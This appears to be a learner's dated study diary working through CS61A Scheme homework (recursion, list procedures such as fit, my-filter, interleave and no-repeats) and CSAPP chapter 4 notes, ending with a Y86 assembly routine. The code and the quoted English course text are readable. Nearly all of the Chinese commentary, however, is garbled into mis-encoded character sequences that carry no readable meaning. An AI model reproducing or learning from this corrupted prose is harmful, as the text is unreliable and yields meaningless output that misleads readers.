- `base case`ï¼šå¦‚æœ*a*æˆ–è€…*b*ä¸­çš„æŸä¸€ä¸ªä¸º0ï¼Œåˆ™è¾“å‡ºä¸ä¸º0çš„å¦ä¸€ä¸ªå€¼
- å¦‚æœ`a mod b == 0`ï¼Œé‚£ä¹ˆè¾“å‡º*b*ï¼ˆé»˜è®¤*b*ä¸ºæœ€å°å€¼ï¼‰
- å¦åˆ™ï¼Œé€’å½’è°ƒç”¨å‡½æ•°ï¼Œå°†*b*å’Œ`a % b`ä½œä¸ºå‚æ•°

ä½†æ˜¯å› ä¸ºåœ¨è¿™é‡Œå¹¶æ²¡æœ‰ç›´æ¥æŒ‡å‡ºaå’Œbçš„å¤§å°ï¼Œæ‰€ä»¥éœ€è¦æ—¶åˆ»åˆ¤æ–­ä¸¤ä¸ªå€¼çš„å¤§å°ã€‚

## 5.28

é¦–å…ˆåˆ é™¤äº†æ˜¨å¤©æœ‰é—®é¢˜çš„gitæœ¬åœ°ä»“åº“ï¼Œé‡æ–°æ‹‰å–ä»£ç ã€‚

åœ¨è‹±æ–‡ä¸­ï¼Œâ€œå¹‚â€é€šå¸¸æŒ‡çš„æ˜¯æŒ‡æ•°æˆ–æŒ‡æ•°è¿ç®—ï¼Œå…¶å…ƒç´ åç§°å¦‚ä¸‹ï¼š

1. **Base**: åŸºæ•°ï¼Œå³è¦è¿›è¡Œå¹‚è¿ç®—çš„æ•°å­—ã€‚
2. **Exponent**: æŒ‡æ•°ï¼Œå³è¡¨ç¤ºå¹‚æ¬¡çš„æ•°å€¼ã€‚
3. **Power**: å¹‚ï¼Œè¡¨ç¤ºåŸºæ•°çš„æŒ‡æ•°æ¬¡å¹‚çš„ç»“æœã€‚

[hw07](https://cs61a.org/hw/hw07/)

Q1ï¼špow

é—®ï¼šè®¾è®¡ä¸€ä¸ªå‡½æ•°ï¼Œæ­¤å‡½æ•°è®¡ç®—ä¸€ä¸ª`base`çš„`exp`æ¬¡å¹‚ï¼Œå¹¶ä¸”éœ€è¦ç”¨é€’å½’å®ç°ã€‚

æ€è·¯ï¼š

- base caseï¼šå¦‚æœ`exp`æ˜¯1æ¬¡ï¼Œåˆ™è¿”å›`base`
- `exp`æ˜¯å¶æ•°ï¼Œåˆ™é€’å½’è°ƒç”¨`(* (pow base (/ exp 2) (pow base (/ exp 2))`
- `exp`æ˜¯å¥‡æ•°ï¼Œåˆ™é€’å½’è°ƒç”¨`(* base (pow base exp - 1))`

å®ç°ï¼š

```scheme
(define (square n) (* n n))

(define (pow base exp) 
  (cond 
    ((= exp 1) base)
    ((even? exp) (square (pow base (/ exp 2))))
    (else (* base (pow base (- exp 1))))
  )
)
```

Q2ï¼šRepeatedly Cube(å€¼å¾—å›é¡¾)

```scheme
(define (repeatedly-cube n x)
    (if (zero? n)
        x
        (let
            ((y (repeatedly-cube (- n 1) x)))
            (* y y y))))
```

> è§£æï¼šThe provided code returns `x` when `n` is zero. This is the correct base case for `repeatedly-cube`; we just need to write the recursive case.
>
> In the recursive case, the provided code returns `(* y y y)`, which is the cube of `y`. We use recursion to set `y` to the result of cubing `x` `n - 1` times. Then the cube of `y` is the result of cubing `x` `n` times, as desired.

ä¿¡ä»°ä¹‹è·ƒï¼š`(repeatedly-cube n x)`å°±æ˜¯è®¡ç®—næ¬¡xçš„ä¸‰æ¬¡æ–¹ï¼Œç­‰äº`(repeatedly-cube (- n 1) x)`çš„ä¸‰æ¬¡æ–¹ã€‚

## 5.29

åŠ æ²¹å®è´~

åœ¨ Scheme ä¸­ï¼Œ`let` æ˜¯ç”¨äºåˆ›å»ºå±€éƒ¨å˜é‡ç»‘å®šçš„ç‰¹æ®Šå½¢å¼ã€‚å®ƒå…è®¸ä½ åœ¨ä¸€ä¸ªè¡¨è¾¾å¼ä¸­å®šä¹‰å±€éƒ¨å˜é‡ï¼Œå¹¶åœ¨è¯¥è¡¨è¾¾å¼çš„ä½œç”¨åŸŸå†…ä½¿ç”¨è¿™äº›å˜é‡ã€‚`let` çš„ä¸€èˆ¬å½¢å¼å¦‚ä¸‹ï¼š

```scheme
(let ((var1 expr1)
      (var2 expr2)
      ...
      (varn exprn))
  body)
```

å…¶ä¸­ï¼š

- `var1`, `var2`, ..., `varn` æ˜¯å±€éƒ¨å˜é‡åã€‚
- `expr1`, `expr2`, ..., `exprn` æ˜¯ä¸æ¯ä¸ªå˜é‡å…³è”çš„è¡¨è¾¾å¼ï¼Œç”¨äºåˆå§‹åŒ–è¿™äº›å˜é‡ã€‚
- `body` æ˜¯åœ¨å±€éƒ¨å˜é‡ç»‘å®šçš„ä½œç”¨åŸŸå†…æ‰§è¡Œçš„è¡¨è¾¾å¼ã€‚

`let` å½¢å¼çš„æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š

1. å¯¹äºæ¯ä¸ª `(var expr)` å¯¹ï¼Œè®¡ç®— `expr` çš„å€¼ï¼Œå¹¶å°†å…¶ç»‘å®šåˆ°å¯¹åº”çš„å˜é‡ `var` ä¸Šã€‚
2. åœ¨è¿™äº›å˜é‡çš„ä½œç”¨åŸŸå†…ï¼Œæ‰§è¡Œ `body` ä¸­çš„è¡¨è¾¾å¼ã€‚
3. è¿”å› `body` ä¸­æœ€åä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼ä½œä¸ºæ•´ä¸ª `let` è¡¨è¾¾å¼çš„å€¼ã€‚

**`cond` è¡¨è¾¾å¼:**

`cond` ç”¨äºå¤šæ¡ä»¶åˆ¤æ–­ï¼Œå…¶è¯­æ³•ç»“æ„å¦‚ä¸‹ï¼š

```scheme
(cond
  (test1 expr1)
  (test2 expr2)
  ...
  (else exprn))
```

- æ¯ä¸ª `(test expr)` å¯¹è¡¨ç¤ºä¸€ä¸ªæ¡ä»¶å’Œå…¶ç›¸åº”çš„è¡¨è¾¾å¼ã€‚
- `test` æ˜¯ä¸€ä¸ªæ¡ä»¶è¡¨è¾¾å¼ï¼Œç”¨äºåˆ¤æ–­æ˜¯å¦æ‰§è¡Œç›¸åº”çš„è¡¨è¾¾å¼ã€‚
- `expr` æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œç”¨äºåœ¨æ»¡è¶³ç›¸åº”çš„æ¡ä»¶æ—¶æ‰§è¡Œã€‚

`cond` ä¼šæŒ‰é¡ºåºé€ä¸ªæ£€æŸ¥æ¡ä»¶ï¼Œå½“æ‰¾åˆ°ç¬¬ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„ `(test expr)` å¯¹æ—¶ï¼Œæ‰§è¡Œç›¸åº”çš„ `expr`ã€‚å¦‚æœæ²¡æœ‰æ¡ä»¶æ»¡è¶³ï¼Œä¸”å­˜åœ¨ `else` å­å¥ï¼Œåˆ™æ‰§è¡Œ `else` å­å¥å¯¹åº”çš„ `expr`ã€‚

**`begin` è¡¨è¾¾å¼**

`begin` ç”¨äºå°†å¤šä¸ªè¡¨è¾¾å¼ç»„åˆæˆä¸€ä¸ªåºåˆ—ï¼Œå…¶è¯­æ³•ç»“æ„å¦‚ä¸‹ï¼š

```scheme
(begin
  expr1
  expr2
  ...
  exprn)
```

`begin` ä¼šæŒ‰é¡ºåºä¾æ¬¡æ‰§è¡Œå…¶ä¸­çš„æ¯ä¸ªè¡¨è¾¾å¼ï¼Œå¹¶è¿”å›æœ€åä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼ä½œä¸ºæ•´ä¸ª `begin` è¡¨è¾¾å¼çš„å€¼ã€‚

**æˆ‘å¿…é¡»æ€è€ƒè¿™æ˜¯ä¸æ˜¯æˆ‘æ­¤ç”Ÿä»…æœ‰çš„æœºä¼š**

csappï¼š

- [x] æè¿°ä¸‹è¿™ä¸€ç« èŠ‚æ˜¯è®²ä»€ä¹ˆçš„
- [x] ç”¨ä»€ä¹ˆå†…å®¹ç»„ç»‡èµ·æ¥çš„
- [x] æœ‰æ²¡æœ‰è§‰å¾—è®©äººçœ¼å‰ä¸€äº®çš„ï¼šé€šä¿—æ˜“æ‡‚çš„æµæ°´çº¿è®²è§£æ–¹å¼

- 4.1 è®¾è®¡ISA åŒ…æ‹¬å¤šç§ç»„ä»¶çš„çŠ¶æ€ã€æŒ‡ä»¤é›†åˆä»¥åŠå¯¹åº”çš„ç¼–ç æ–¹å¼

- 4.2 combinational logic
  to compute functions on the bits, 

  memory elements to store bits, 

  and clock signals
  to regulate the updating of the memory elements.

  hardware control language
- 4.3 åˆ©ç”¨ç†è®ºçŸ¥è¯†æ„å»ºseqï¼ˆsequential processorï¼‰
- 4.4 æ„å»ºå®Œseqåï¼Œå‘ç°é€Ÿåº¦å¾ˆæ…¢ï¼ˆwhyï¼‰ï¼Œéœ€è¦pipeliningæ¥æå‡ååé‡
- 4.5 å®ç°æµæ°´çº¿

## 5.30

[Discussion 9: Scheme, Scheme Lists](https://cs61a.org/disc/disc09/)

> ### Q1: Perfect Fit
>
> **Definition**: A perfect square is `k*k` for some integer `k`.
>
> Implement `fit`, which takes non-negative integers `total` and `n`. It returns whether there are `n` **different** positive perfect squares that sum to `total`.
>
> **Important:** Don't use the Scheme interpreter to tell you whether you've implemented it correctly. Discuss! On the final exam, you won't have an interpreter.

```scheme
;;; Return whether there are n perfect squares with no repeats that sum to total
(define (fit total n)
    (define (f total n k)				
        (if (and (= n 0) (= total 0))	;æ­£å¥½nä¸ªå¹¶ä¸”æ€»å’Œä¸º0
            #t
        (if (< total (* k k))			;è‹¥æ­¤æ—¶å¹³æ–¹å’Œå¤§äºæ€»å’Œ
            #f
        (or (f total n (+ k 1)) (f (- total (* k k)) (- n 1) (+ k 1)))					
        )))
    (f total n 1))

(expect (fit 10 2) #t)  ; 1*1 + 3*3
(expect (fit 9 1)  #t)  ; 3*3
(expect (fit 9 2)  #f)  ;
(expect (fit 9 3)  #f)  ; 1*1 + 2*2 + 2*2 doesn't count because of repeated 2*2
(expect (fit 25 1)  #t) ; 5*5
(expect (fit 25 2)  #t) ; 3*3 + 4*4
```

å¯ä»¥çœ‹å‡ºï¼Œæƒ³é€šè¿‡å‡½æ•°`f total n k`æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨nä¸ªå¹³æ–¹å’Œä¸totalå€¼ç›¸åŒã€‚è‹¥å­˜åœ¨ï¼Œåˆ™è¿”å›`#t`ï¼Œå¦åˆ™è¿”å›`#f`ã€‚æœ€åˆå¼€å§‹è°ƒç”¨å‡½æ•°`f`çš„æ—¶å€™ï¼Œkçš„åˆå§‹å€¼ä¸º1ã€‚

é€’å½’è°ƒç”¨çš„æ€è·¯ï¼šæ²¡æƒ³å‡ºæ¥ï¼Œç´¢æ€§ä¸¢åˆ°gptä¸­è¿›è¡Œåˆ†æï¼Œç°åœ¨çœ‹ä¸‹gptç»™å‡ºçš„å›ç­”ï¼š

> è¿™ä¸ª Scheme ä»£ç å®ç°äº†ä¸€ä¸ªé€’å½’å‡½æ•° `fit`ï¼Œè¯¥å‡½æ•°åˆ¤æ–­æ˜¯å¦å¯ä»¥ç”¨ `n` ä¸ªæ­£æ•´æ•°çš„å¹³æ–¹å’Œæ¥æ„æˆä¸€ä¸ªç»™å®šçš„æ€»å’Œ `total`ã€‚å®ƒé€šè¿‡é€’å½’åœ°å°è¯•ä¸åŒçš„æ•´æ•°å¹³æ–¹å’Œæ¥æ‰¾åˆ°ä¸€ä¸ªç»„åˆï¼Œä½¿å¾— `n` ä¸ªæ•´æ•°çš„å¹³æ–¹å’Œæ­£å¥½ç­‰äº `total`ã€‚
>
> ### åŠŸèƒ½è¯´æ˜
>
> `fit` å‡½æ•°æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼š`total` å’Œ `n`ã€‚å®ƒè°ƒç”¨å†…éƒ¨çš„è¾…åŠ©å‡½æ•° `f`ï¼Œä» `k = 1` å¼€å§‹é€’å½’è®¡ç®—ã€‚
>
> `f` å‡½æ•°æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼š`total`ã€`n` å’Œ `k`ã€‚
>
> - `total`ï¼šå½“å‰å‰©ä½™éœ€è¦æ„æˆçš„æ€»å’Œã€‚
> - `n`ï¼šå½“å‰å‰©ä½™éœ€è¦ä½¿ç”¨çš„æ­£æ•´æ•°çš„ä¸ªæ•°ã€‚
> - `k`ï¼šå½“å‰å°è¯•çš„æ­£æ•´æ•°ã€‚
>
> ### é€’å½’è§„åˆ™
>
> 1. **åŸºç¡€æƒ…å†µ**ï¼š
>
>    - `(and (= n 0) (= total 0))`ï¼šå¦‚æœå‰©ä½™çš„æ•´æ•°ä¸ªæ•° `n` ä¸º 0 ä¸”æ€»å’Œ `total` ä¹Ÿä¸º 0ï¼Œè¯´æ˜æ‰¾åˆ°äº†ä¸€ç»„æ»¡è¶³æ¡ä»¶çš„æ•´æ•°ï¼Œè¿”å› `#t`ã€‚
>    - `(< total (* k k))`ï¼šå¦‚æœå½“å‰å‰©ä½™çš„æ€»å’Œ `total` å°äºå½“å‰æ•´æ•° `k` çš„å¹³æ–¹ï¼Œè¯´æ˜æ— æ³•ç»§ç»­æ„æˆï¼Œè¿”å› `#f`ã€‚
>
> 2. **é€’å½’æƒ…å†µ**ï¼š
>
>    - ```scheme
>      (or (f total n (+ k 1)) (f (- total (* k k)) (- n 1) (+ k 1)))
>      ```
>
>      - `(f total n (+ k 1))`ï¼šä¸ä½¿ç”¨å½“å‰æ•´æ•° `k`ï¼Œç›´æ¥å°è¯•ä¸‹ä¸€ä¸ªæ•´æ•° `k+1`ï¼Œä¿æŒå½“å‰çš„ `total` å’Œ `n` ä¸å˜ã€‚
>      - `(f (- total (* k k)) (- n 1) (+ k 1))`ï¼šä½¿ç”¨å½“å‰æ•´æ•° `k`ï¼Œå°† `total` å‡å» `k` çš„å¹³æ–¹ï¼Œå°† `n` å‡ 1ï¼Œç„¶åå°è¯•ä¸‹ä¸€ä¸ªæ•´æ•° `k+1`ã€‚

å­¦åˆ°çš„ä¸œè¥¿ï¼šå¦‚æœä½ ä¸èƒ½é˜é‡Šæ¸…æ¥šè¿™ä¸ªé—®é¢˜ï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡æ˜¯ä¸äº†è§£è¿™ä¸ªé—®é¢˜çš„ã€‚

ä½†æ˜¯é˜è¿°è¿™ä¸ªé€’å½’çš„é—®é¢˜ä¹Ÿæœ‰æŠ€å·§ï¼Œé¦–å…ˆéœ€è¦å°†å‡½æ•°çš„å…¥å‚å’Œè¿”å›å€¼ç¡®å®šå¥½ï¼Œè¿™ä¸€æ­¥å°±æ˜¯è¿™ä¸ªå‡½æ•°çš„é»‘ç›’å±æ€§ï¼Œè¾“å…¥ä»€ä¹ˆå’Œè¾“å‡ºä»€ä¹ˆï¼›

å¦ä¸€ä¸ªå°±æ˜¯é€’å½’ï¼Œé€’å½’çš„`base case`ï¼Œå¯¹äºå…¶ä¸­æ¶‰åŠåˆ°çš„å‚æ•°å°½é‡ç”¨å®é™…æ„ä¹‰è¡¨ç¤ºå‡ºæ¥ã€‚ä¾‹å¦‚`n`å®é™…æ„ä¹‰å°±æ˜¯`å½“å‰å‰©ä½™éœ€è¦ä½¿ç”¨çš„æ­£æ•´æ•°çš„ä¸ªæ•°`ï¼Œå†™çš„æ—¶å€™å¯ä»¥é€‚å½“ç®€åŒ–è¿™ä¸ªæè¿°ï¼Œä½†æ˜¯ä¸èƒ½è¿‡åˆ†ç®€åŒ–æè¿°ä»¥è‡³äºå¤±å»æœ¬è´¨çš„æ„æ€ï¼Œè€ŒåŒ–ä¸ºç¬¦å·æ ‡è¯†ã€‚

> ### Q2: Nested Lists
>
> Create the nested list depicted below three different ways: using `list`, `quote`, and `cons`.
>
> ![linked list](https://cs61a.org/disc/disc09/assets/make-list.png)
>
> First, describe the list together: "It looks like there are four elements, and the first element is ..." If you get stuck, look at the hint below. (But try to describe it yourself first!)
>
> Hint: Description
>
> A four-element list in which the first element is a list containing both `a` and `b`, the second element is `c`, the third element is `d`, and the fourth element is a list containing just `e`.
>
> Next, use calls to `list` to construct this list. If you run this code and then `(draw with-list)` in [code.cs61a.org](https://code.cs61a.org/scheme), the `draw` procedure will draw what you've built.

å¯¹äºè¿™ä¸ªåµŒå¥—åˆ—è¡¨çš„æè¿°ï¼š

- åµŒå¥—åˆ—è¡¨æœ‰å››ä¸ªå…ƒç´ 
- ç¬¬ä¸€ä¸ªå…ƒç´ ä¹Ÿæ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œè¡¨ç¤ºä¸º`(list 'a 'b)`
- ç¬¬äºŒä¸‰ä¸ªå…ƒç´ å°±æ˜¯ç®€å•çš„å¼•ç”¨å…ƒç´ 
- ç¬¬å››ä¸ªå…ƒç´ ä¹Ÿæ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œè¡¨ç¤ºä¸º`(list 'e)`

ä¸Šåˆ9:00-12:00ä¸‰å°æ—¶æ€»ç»“ï¼š

1. å¦‚ä½•ç»„ç»‡é€’å½’é—®é¢˜çš„æ±‚è§£æ€è·¯ï¼šç¡®å®šå‡½æ•°çš„åŠŸèƒ½ï¼ˆå®ç°åŠŸèƒ½ã€å‚æ•°æ„ä¹‰ï¼‰ï¼Œæ˜ç¡®é€’å½’è§„åˆ™ï¼ˆ`base case`å’Œé€’å½’æƒ…å†µï¼‰
2. schemeçš„listè¯­æ³•

## 5.31

> è¿™é‡Œç®€å•è®°å½•ä¸‹è‡ªå·±ä»Šå¤©çš„æ—¶é—´ä½¿ç”¨ï¼š
>
> 11ï¼š30-11:53 èƒŒå•è¯
>
> 12:00 - 13:47 åˆ†æhw08ï¼ˆæ„Ÿè§‰æ—¶é—´ç”¨çš„æœ‰ç‚¹ä¹…ï¼‰

**[Homework 8: Scheme Lists](https://cs61a.org/hw/hw08/)**

**Q1: Ascending**

`ascending?`é€’å½’åˆ†æï¼š

- å…¥å‚åŠè¾“å‡ºï¼šè¾“å…¥ä¸€ä¸ªåˆ—è¡¨ï¼Œè¾“å‡ºæ˜¯å¦ä¸ºéé€’å‡åˆ—è¡¨
- base caseï¼š
  - å¦‚æœåˆ—è¡¨ä¸ºç©ºï¼Œè¿”å›`#t`
  - ä»å¤´å¼€å§‹æ‹¿ä¸¤ä¸ªå…ƒç´ `first`å’Œ`second`ï¼Œå¦‚æœ`second`å°äº`first`åˆ™è¿”å›`#f`
- é€’å½’ç»§ç»­ï¼šä¸¤ä¸ªæ¡ä»¶éƒ½æ²¡æ»¡è¶³ï¼Œè¯æ˜è¿˜æ²¡åˆ¤æ–­å®Œæˆï¼Œèˆå¼ƒåŒ…å«`first`çš„èŠ‚ç‚¹çš„å‰©ä½™åˆ—è¡¨ï¼Œç»§ç»­è°ƒç”¨`ascending?`

**Q2: My Filter**

`(my-filter pred s)`åˆ†æï¼š

- è¾“å…¥è¾“å‡ºï¼šè¾“å…¥åˆ—è¡¨`s`å’Œæ¡ä»¶å‡½æ•°`pred`ï¼Œè¿”å›åˆ—è¡¨`s`ä¸­ç¬¦åˆæ¡ä»¶`pred`çš„å…ƒç´ ç»„æˆçš„åˆ—è¡¨ã€‚
- base caseï¼š
  - å¦‚æœåˆ—è¡¨ä¸ºç©ºï¼Œåˆ™è¿”å›ç©ºåˆ—è¡¨`nil`ï¼Œæ­¤æ—¶åˆ—è¡¨å·²ç»æ²¡æœ‰å‰©ä½™å…ƒç´ 
  - æ‹¿å‡ºç¬¬ä¸€ä¸ªå…ƒç´ `elem`ä½œä¸ºæ¡ä»¶å‡½æ•°`pred`çš„å…¥å‚ï¼Œè‹¥è¾“å‡ºç»“æœä¸ºçœŸï¼Œåˆ™è¿”å›ä¸€ä¸ªå•å…ƒç´ `elem`åˆ—è¡¨å’Œé€’å½’è°ƒç”¨`(my-filter pred rest-s)`ï¼Œå¹¶å°†é€’å½’è°ƒç”¨çš„åˆ—è¡¨ä¸`(list elem)`åˆå¹¶(`append`)ã€‚
- é€’å½’åˆ†æï¼šç¬¬ä¸€ä¸ªå…ƒç´ å’Œå‰©ä½™åˆ—è¡¨

**Q3: Interleave**

`(interleave lst1 lst2)`åˆ†æï¼š

- åŠŸèƒ½ï¼šå°†ä¸¤ä¸ªåˆ—è¡¨çš„å…ƒç´ äº¤æ›¿æ’åˆ—æˆä¸€ä¸ªæ–°çš„åˆ—è¡¨ã€‚å¦‚æœä¸€ä¸ªåˆ—è¡¨æ¯”å¦ä¸€ä¸ªåˆ—è¡¨é•¿ï¼Œé‚£ä¹ˆäº¤æ›¿å®ŒçŸ­åˆ—è¡¨çš„å…ƒç´ åï¼Œå°†å‰©ä½™çš„é•¿åˆ—è¡¨å…ƒç´ é™„åŠ åˆ°æ–°åˆ—è¡¨åé¢ã€‚
- base caseï¼š
  - å¦‚æœä¸¤ä¸ªåˆ—è¡¨éƒ½ä¸ºç©ºï¼Œè¯æ˜ä¸¤ä¸ªåˆ—è¡¨æ²¡æœ‰å…ƒç´ å¯ä»¥äº¤æ›¿ï¼Œæ­¤æ—¶è¿”å›ç©ºåˆ—è¡¨
  - è‹¥å…¶ä¸­æœ‰ä¸€ä¸ªä¸ºç©ºï¼Œåˆ™å¦ä¸€ä¸ªå…ƒç´ åˆ—è¡¨éœ€è¦é™„åœ¨æ–°åˆ—è¡¨åé¢
- é€’å½’åˆ†æï¼šæ‹¿å‡ºä¸¤ä¸ªåˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œåˆ—è¡¨1å…ƒç´ `elem1`åœ¨å‰ï¼Œåˆ—è¡¨2å…ƒç´ `elem2`åœ¨åï¼Œç»„æˆæ–°åˆ—è¡¨ã€‚ç„¶å`append`é™„ä¸Š`(interleave rest-lst1 rest-lst2)`

**Q4: No Repeats**

 `(no-repeats s)`åˆ†æï¼š

- åŠŸèƒ½ï¼šè¿”å›æ•°å­—åˆ—è¡¨`s`ä¸­ä¸é‡å¤çš„å…ƒç´ æ„æˆçš„åˆ—è¡¨
- base caseï¼šï¼ˆæƒ³ä¸åˆ°å¾ˆå¥½åœ°æ‰¾åˆ°é‡å¤æ•°å­—çš„æ–¹æ³•ï¼Œçœ‹ç­”æ¡ˆè§£æï¼‰

> ### Q4: No Repeats
>
> Implement `no-repeats`, which takes a list of numbers `s`. It returns a list that has all of the unique elements of `s` in the order that they first appear, but no repeats.
>
> For example, `(no-repeats (list 5 4 5 4 2 2))` evaluates to `(5 4 2)`.
>
> > **Hint:** You may find it helpful to use `filter` with a `lambda` procedure to filter out repeats. To test if two numbers `a` and `b` are not equal, use `(not (= a b))`.
>
> ```scheme
> (define (no-repeats s)
>   (if (null? s) s
>     (cons (car s)
>       (no-repeats (filter (lambda (x) (not (= (car s) x))) (cdr s))))))
> ```
>
> For the base case, if the input list is empty, then we do nothing and return the empty list.
>
> Otherwise, we may attempt to proceed with the intuition that removing repeats would require us to keep track of what elements we have already "seen". However, this would require a helper to keep track of seen elements. Furthermore, Scheme does not have a built-in containment predicate analog to Python's `in` keyword.
>
> Thus, we realize that we can instead remove all repeats of an element while iterating through our list. The idea is that as we iterate through an element of the list, we simultaneously remove all other instances of that element from the rest of the list. This ensures that there is only one instance of that element in the list. We achieve this by applying a filter onto the rest of the list.

é€’å½’åˆ†æï¼š

1. åŸºç¡€æƒ…å†µï¼š
   - å¦‚æœåˆ—è¡¨ `s` ä¸ºç©ºï¼Œè¿”å›ç©ºåˆ—è¡¨ã€‚
2. é€’å½’æƒ…å†µï¼š
   - ä½¿ç”¨ `cons` å°†åˆ—è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´  `car s` æ”¾å…¥ç»“æœåˆ—è¡¨ä¸­ã€‚
   - ä½¿ç”¨ `filter` è¿‡æ»¤æ‰æ‰€æœ‰ä¸ `car s` ç›¸ç­‰çš„å…ƒç´ ï¼Œä»å‰©ä½™çš„åˆ—è¡¨ `cdr s` ä¸­ç§»é™¤è¿™äº›å…ƒç´ ã€‚
   - é€’å½’è°ƒç”¨ `no-repeats` å¤„ç†è¿‡æ»¤åçš„åˆ—è¡¨ï¼Œå¹¶å°†ç»“æœä¸å½“å‰å…ƒç´ ç»„åˆæˆæ–°çš„åˆ—è¡¨ã€‚

lambdaè¡¨è¾¾å¼è¯¦è§£`(filter (lambda (x) (not (= (car s) x))) (cdr s))`:

- **`car s`**ï¼šåˆ—è¡¨ `s` çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚
- **`cdr s`**ï¼šåˆ—è¡¨ `s` çš„å‰©ä½™éƒ¨åˆ†ï¼ˆå³å»æ‰ç¬¬ä¸€ä¸ªå…ƒç´ åçš„å­åˆ—è¡¨ï¼‰
- **`lambda (x) (not (= (car s) x))`**ï¼šä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œæ¥å—ä¸€ä¸ªå‚æ•° `x`ï¼Œå¹¶è¿”å›å¸ƒå°”å€¼ `#t` å¦‚æœ `x` ä¸ç­‰äº `car s`ï¼Œå¦åˆ™è¿”å› `#f`ã€‚

è¿™ä¸ªè¡¨è¾¾å¼å®ç°äº†ä»å‰©ä½™åˆ—è¡¨`cdr s`ä¸­ï¼Œç­›é€‰å‡ºä¸åˆ—è¡¨`s`ç¬¬ä¸€ä¸ªå…ƒç´ `car s`ä¸é‡å¤çš„å…ƒç´ åˆ—è¡¨ã€‚

**csappï¼š**

å›é¡¾å¸¸ç”¨æ±‡ç¼–æŒ‡ä»¤(retã€cmp)

- retï¼šå°†æ ˆé¡¶æŒ‡é’ˆæŒ‡å‘çš„åœ°å€æ•°æ®èµ‹å€¼ç»™ç¨‹åºè®¡æ•°å™¨ï¼Œå¹¶ä¸”å°†æ ˆé¡¶å…ƒç´ å¼¹å‡ºã€‚



```assembly
# ls in %rdi
rsum_list:
	pushq %rbx		  		# Save %rbx
	rrmovq %rdi, %rbx 		# Store ls in callee-saved register
	irmovq $0, %rax			# Set return value = 0
	andq %rbx, %rbx			# if(!ls)
	je .L35
	mrmovq (%rdi), %rbx     # val = ls->val
    mrmovq 8(%rdi), %rdi    # ls = ls->next
	call rsum_list			# rsum_list(ls->next)
	addq %rbx, %rax			# val + rest
.L35:
	popq %rbx
	ret
```
